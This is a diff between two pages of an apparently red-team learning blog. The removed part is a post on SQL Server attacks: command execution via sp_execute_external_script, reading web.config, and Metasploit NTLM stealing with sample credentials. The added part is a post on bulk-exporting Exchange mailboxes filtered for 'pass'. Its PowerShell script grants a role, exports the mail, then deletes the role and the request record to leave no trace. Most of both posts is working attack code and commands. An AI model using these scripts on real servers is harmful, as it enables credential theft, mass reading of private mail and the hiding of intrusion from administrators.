+    	<span class="token variable">$Session</span> = <span class="token function">New-PSSession</span> <span class="token operator">-</span>ConfigurationName Microsoft<span class="token punctuation">.</span>Exchange <span class="token operator">-</span>ConnectionUri <span class="token variable">$ConnectionUri</span> <span class="token operator">-</span>Authentication Kerberos <span class="token operator">-</span>Credential <span class="token variable">$Credential</span>
+    	<span class="token function">Import-PSSession</span> <span class="token variable">$Session</span> <span class="token operator">-</span>AllowClobber<span class="token punctuation">|</span> <span class="token function">Out-Null</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">Write-Host</span> <span class="token string">"[+] Start to export mail"</span> 
+    <span class="token comment">#Export mail and do not save the export request</span>
+    <span class="token function">New-MailboxexportRequest</span> <span class="token operator">-</span>mailbox <span class="token variable">$MailBox</span> <span class="token operator">-</span>ContentFilter <span class="token variable">$Filter</span> <span class="token operator">-</span>FilePath <span class="token punctuation">(</span><span class="token variable">$ExportPath</span><span class="token operator">+</span><span class="token variable">$MailBox</span><span class="token operator">+</span><span class="token string">".pst"</span><span class="token punctuation">)</span> <span class="token operator">-</span>CompletedRequestAgeLimit 0
+    
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Flag</span> = 0<span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+    	<span class="token function">Write-Host</span> <span class="token string">"[>] Start to remove user"</span>
+    	<span class="token comment">#Remove user</span>
+    	<span class="token function">Get-ManagementRoleAssignment</span> <span class="token punctuation">(</span><span class="token string">"Mailbox Import Export-"</span><span class="token operator">+</span><span class="token variable">$User</span><span class="token punctuation">)</span> <span class="token punctuation">|</span><span class="token function">Remove-ManagementRoleAssignment</span> <span class="token operator">-</span>Confirm:<span class="token boolean">$false</span>
+    <span class="token punctuation">&#125;</span>
+    
+    <span class="token function">Write-Host</span> <span class="token string">"[>] Start to Remove-PSSession"</span>
+    <span class="token comment">#Remove PSSession</span>
+    <span class="token function">Remove-PSSession</span> <span class="token variable">$Session</span>
+    <span class="token function">Write-Host</span> <span class="token string">"[+] All done."</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20common%20attack%20methods/image-20210724132756918.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">get dir
-execute master..xp_dirtree &#39;c:&#39;
-execute master..xp_dirtree &#39;c:&#39;,1 
-execute master..xp_dirtree &#39;c:&#39;,1,1 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="Use-exchange-1"><a href="#Use-exchange-1" class="headerlink" title="Use exchange"></a>Use exchange</h3><h4 id="Export-special-user-1"><a href="#Export-special-user-1" class="headerlink" title="Export special user"></a>Export special user</h4><pre class="line-numbers language-none"><code class="language-none">Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn;
+$User &#x3D; &quot;yangsir&quot;
+New-MailboxexportRequest -mailbox $User -FilePath (&quot;\\localhost\c$\daochu\&quot;+$User+&quot;.pst&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20common%20attack%20methods/image-20210724134413840.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">python exec
-EXECUTE sp_execute_external_script @language &#x3D; N&#39;Python&#39;, @script &#x3D; N&#39;print(__import__(&quot;getpass&quot;).getuser())&#39;
-EXECUTE sp_execute_external_script @language &#x3D; N&#39;Python&#39;, @script &#x3D; N&#39;print(__import__(&quot;os&quot;).system(&quot;whoami&quot;))&#39;
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.39.18.png"></p>
+<h4 id="PS-AUTO-1"><a href="#PS-AUTO-1" class="headerlink" title="PS AUTO"></a>PS AUTO</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">same way <span class="token keyword">from</span> the 3gstudent
 
+<span class="token keyword">function</span> DirectExportMailfromExchange
+<span class="token punctuation">&#123;</span>
+<span class="token comment">#Requires -Version 2.0</span>
+<span class="token comment">&lt;#
+.SYNOPSIS
+This script will export the mail(.pst) from the Exchange server.
+The script needs to be executed on the Exchange server.
 
-EXECUTE sp_execute_external_script @language &#x3D; N&#39;Python&#39;, @script &#x3D; N&#39;print(open(&quot;C:\\inetpub\\wwwroot\\web.config&quot;, &quot;r&quot;).read())&#39;
+Author: 3gstudent
 
+.PARAMETER MailBox
+The mail you want to export.
 
-EXECUTE sp_execute_external_script @language &#x3D; N&#39;Python&#39;, @script &#x3D; N&#39;
-import sys
-print(sys.version)
-&#39;
-GO<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+.PARAMETER ExportPath
+The export path of the mail.
+ 
+.PARAMETER $Filter
+The search filter of the mail.
 
-<h3 id="sqlserver-amp-smbrelay"><a href="#sqlserver-amp-smbrelay" class="headerlink" title="sqlserver&amp;smbrelay"></a>sqlserver&amp;smbrelay</h3><pre class="line-numbers language-none"><code class="language-none">No relevant environment is currently available
+.PARAMETER $Version
+The version of the Exhange.
+It can be 2007,2010,2013 and 2016.
 
-you can read:
-https:&#x2F;&#x2F;www.netspi.com&#x2F;blog&#x2F;technical&#x2F;network-penetration-testing&#x2F;executing-smb-relay-attacks-via-sql-server-using-metasploit&#x2F;
+.EXAMPLE
+PS C:\> DirectExportMailfromExchange -MailBox "test1" -ExportPath "\\localhost\c$\test\" -Filter "&#123;`"(body -like `"*pass*`")`"&#125;" -Version 2013
+#></span>
+ 	<span class="token keyword">param</span> <span class="token punctuation">(</span>
+        <span class="token namespace">[Parameter(Mandatory = $True)]</span>
+		<span class="token namespace">[string]</span><span class="token variable">$MailBox</span><span class="token punctuation">,</span>
+        <span class="token namespace">[Parameter(Mandatory = $True)]</span>
+		<span class="token namespace">[string]</span><span class="token variable">$ExportPath</span><span class="token punctuation">,</span>
+        <span class="token namespace">[Parameter(Mandatory = $True)]</span>
+		<span class="token namespace">[string]</span><span class="token variable">$Filter</span><span class="token punctuation">,</span>
+        <span class="token namespace">[Parameter(Mandatory = $True)]</span>
+		<span class="token namespace">[string]</span><span class="token variable">$Version</span>
+	<span class="token punctuation">)</span>
 
-like this:
-msf6 auxiliary(admin&#x2F;mssql&#x2F;mssql_ntlm_stealer) &gt; options
+    <span class="token function">Write-Host</span> <span class="token string">"[>] Start to add PSSnapin"</span> 
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Version</span> <span class="token operator">-eq</span> 2007<span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token function">Add-PSSnapin</span> Microsoft<span class="token punctuation">.</span>Exchange<span class="token punctuation">.</span>Management<span class="token punctuation">.</span>PowerShell<span class="token punctuation">.</span>Admin<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
 
-Module options (auxiliary&#x2F;admin&#x2F;mssql&#x2F;mssql_ntlm_stealer):
+    <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$Version</span> <span class="token operator">-eq</span> 2010<span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token function">Add-PSSnapin</span> Microsoft<span class="token punctuation">.</span>Exchange<span class="token punctuation">.</span>Management<span class="token punctuation">.</span>PowerShell<span class="token punctuation">.</span>E2010<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
 
-   Name                 Current Setting  Required  Description
-   ----                 ---------------  --------  -----------
-   PASSWORD             admin            no        The password for the specified username
-   RHOSTS               192.168.3.73     yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
-   RPORT                1433             yes       The target port (TCP)
-   SMBPROXY             0.0.0.0          yes       IP of SMB proxy or sniffer.
-   TDSENCRYPTION        false            yes       Use TLS&#x2F;SSL for TDS data &quot;Force Encryption&quot;
-   THREADS              1                yes       The number of concurrent threads (max one per host)
-   USERNAME             sa               no        The username to authenticate as
-   USE_WINDOWS_AUTHENT  true             yes       Use windows authentification (requires DOMAIN option set)
+    <span class="token keyword">else</span>
+    <span class="token punctuation">&#123;</span>
+        
+        <span class="token function">Add-PSSnapin</span> Microsoft<span class="token punctuation">.</span>Exchange<span class="token punctuation">.</span>Management<span class="token punctuation">.</span>PowerShell<span class="token punctuation">.</span>SnapIn<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+  
+    <span class="token function">Write-Host</span> <span class="token string">"[+] Start to export mail"</span> 
+    <span class="token comment">#Export mail and do not save the export request</span>
+    <span class="token function">New-MailboxexportRequest</span> <span class="token operator">-</span>mailbox <span class="token variable">$MailBox</span> <span class="token operator">-</span>ContentFilter <span class="token punctuation">&#123;</span><span class="token punctuation">(</span>body <span class="token operator">-like</span> <span class="token string">"*pass*"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span> <span class="token operator">-</span>FilePath <span class="token punctuation">(</span><span class="token variable">$ExportPath</span><span class="token operator">+</span><span class="token variable">$MailBox</span><span class="token operator">+</span><span class="token string">".pst"</span><span class="token punctuation">)</span> <span class="token operator">-</span>CompletedRequestAgeLimit 0
+    <span class="token function">Write-Host</span> <span class="token string">"[+] All done."</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-msf6 auxiliary(admin&#x2F;mssql&#x2F;mssql_ntlm_stealer) &gt; set smbproxy targetip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="Search"><a href="#Search" class="headerlink" title="Search"></a>Search</h2><h3 id="PSSession-2"><a href="#PSSession-2" class="headerlink" title="PSSession"></a>PSSession</h3><pre class="line-numbers language-none"><code class="language-none">the same way to export<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h3 id="about-mssqlclient-py"><a href="#about-mssqlclient-py" class="headerlink" title="about mssqlclient.py"></a>about mssqlclient.py</h3><pre class="line-numbers language-none"><code class="language-none">python3 mssqlclient.py -db master -windows-auth rootkit.org&#x2F;sqladmin:Admin12345@192.168.3.73<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.39.22.png"></p>
+<h3 id="Use-exchange-2"><a href="#Use-exchange-2" class="headerlink" title="Use exchange"></a>Use exchange</h3><pre class="line-numbers language-none"><code class="language-none">all tar to find the key
+Get-Mailbox|Search-Mailbox -SearchQuery &quot;*pass*&quot; -EstimateResultOnly
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20common%20attack%20methods/image-20210724135209969.png"></p>
-<h3 id="about-sqsh"><a href="#about-sqsh" class="headerlink" title="about sqsh"></a>about sqsh</h3><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20common%20attack%20methods/image-20210724140056645.png"></p>
+all tar to find the key to export tar user dir
+Get-Mailbox|Search-Mailbox -SearchQuery &quot;*pass*&quot; -TargetMailbox &quot;user&quot; -TargetFolder &quot;out&quot; -LogLevel Suppress
+
+tar user to find the key to export tar user dir
+Search-Mailbox -Identity yangsir -SearchQuery &quot;*pass*&quot; -TargetMailbox &quot;user&quot; -TargetFolder &quot;out&quot; -LogLevel Suppress<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre class="line-numbers language-none"><code class="language-none">let user into the Discovery Management group<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.39.35.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">then go to this module<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.39.39.png"></p>
 
                 
             </div>
@@ -737,7 +791,7 @@ msf6 auxiliary(admin&#x2F;mssql&#x2F;mssql_ntlm_stealer) &gt; set smbproxy targe
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://yangsirrr.github.io/2021/07/24/sqlserver-common-attack-methods/">https://yangsirrr.github.io/2021/07/24/sqlserver-common-attack-methods/</a>
+                    <a href="https://yangsirrr.github.io/2021/07/30/exchange-export-email-methods/">https://yangsirrr.github.io/2021/07/30/exchange-export-email-methods/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -779,20 +833,12 @@ msf6 auxiliary(admin&#x2F;mssql&#x2F;mssql_ntlm_stealer) &gt; set smbproxy targe
                                     <span class="chip bg-color">Redteam</span>
                                 </a>
                             
+                                <a href="/tags/Exchange/">
+                                    <span class="chip bg-color">Exchange</span>
+                                </a>
+                            
                                 <a href="/tags/Information-collection/">
                                     <span class="chip bg-color">Information collection</span>
-                                </a>
-                            
-                                <a href="/tags/Sqlserver/">
-                                    <span class="chip bg-color">Sqlserver</span>
-                                </a>
-                            
-                                <a href="/tags/Database/">
-                                    <span class="chip bg-color">Database</span>
-                                </a>
-                            
-                                <a href="/tags/Command-execution/">
-                                    <span class="chip bg-color">Command execution</span>
                                 </a>
                             
                         </div>
@@ -838,16 +884,17 @@ msf6 auxiliary(admin&#x2F;mssql&#x2F;mssql_ntlm_stealer) &gt; set smbproxy targe
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
             <div class="card">
-                <a href="/2021/07/26/proxylogon-utilization-method/">
+                <a href="/2021/07/30/exchange-export-email-methods/">
                     <div class="card-image">
                         
-                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method/image-20210726161008442.png" class="responsive-img" alt="ProxyLogon Utilization method">
+                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.20.29.png" class="responsive-img" alt="Exchange Export email methods">
                         
-                        <span class="card-title">ProxyLogon Utilization method</span>
+                        <span class="card-title">Exchange Export email methods</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -857,9 +904,66 @@ msf6 auxiliary(admin&#x2F;mssql&#x2F;mssql_ntlm_stealer) &gt; set smbproxy targe
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-07-26
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-30
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Learning-record/" class="post-category">
+                                    Learning record
+                                </a>
+                            
+                            
                         </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Redteam/">
+                        <span class="chip bg-color">Redteam</span>
+                    </a>
+                    
+                    <a href="/tags/Exchange/">
+                        <span class="chip bg-color">Exchange</span>
+                    </a>
+                    
+                    <a href="/tags/Information-collection/">
+                        <span class="chip bg-color">Information collection</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/07/29/exchange-rce-methods/">
+                    <div class="card-image">
+                        
+                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.42.37.png" class="responsive-img" alt="Exchange RCE methods">
+                        
+                        <span class="card-title">Exchange RCE methods</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-29
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -883,76 +987,20 @@ msf6 auxiliary(admin&#x2F;mssql&#x2F;mssql_ntlm_stealer) &gt; set smbproxy targe
                         <span class="chip bg-color">Exchange</span>
                     </a>
                     
+                    <a href="/tags/CVE-2020-17144/">
+                        <span class="chip bg-color">CVE-2020-17144</span>
+                    </a>
+                    
+                    <a href="/tags/CVE-2020-16875/">
+                        <span class="chip bg-color">CVE-2020-16875</span>
+                    </a>
+                    
+                    <a href="/tags/CVE-2020-0688/">
+                        <span class="chip bg-color">CVE-2020-0688</span>
+                    </a>
+                    
                     <a href="/tags/RCE/">
                         <span class="chip bg-color">RCE</span>
-                    </a>
-                    
-                    <a href="/tags/ProxyLogon/">
-                        <span class="chip bg-color">ProxyLogon</span>
-                    </a>
-                    
-                    <a href="/tags/CVE-2021-26855/">
-                        <span class="chip bg-color">CVE-2021-26855</span>
-                    </a>
-                    
-                    <a href="/tags/CVE-2021-27065/">
-                        <span class="chip bg-color">CVE-2021-27065</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                Next&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2021/07/23/some-ways-to-download-files-remotely-from-github/">
-                    <div class="card-image">
-                        
-                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Some%20ways%20to%20download%20files%20remotely%20from%20Github/image-20210723213650376.png" class="responsive-img" alt="Some ways to download files remotely from Github">
-                        
-                        <span class="card-title">Some ways to download files remotely from Github</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-23
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/Miscellaneous-record/" class="post-category">
-                                    Miscellaneous record
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/Redteam/">
-                        <span class="chip bg-color">Redteam</span>
-                    </a>
-                    
-                    <a href="/tags/Bypass/">
-                        <span class="chip bg-color">Bypass</span>
-                    </a>
-                    
-                    <a href="/tags/File-download/">
-                        <span class="chip bg-color">File download</span>
                     </a>
                     
                 </div>
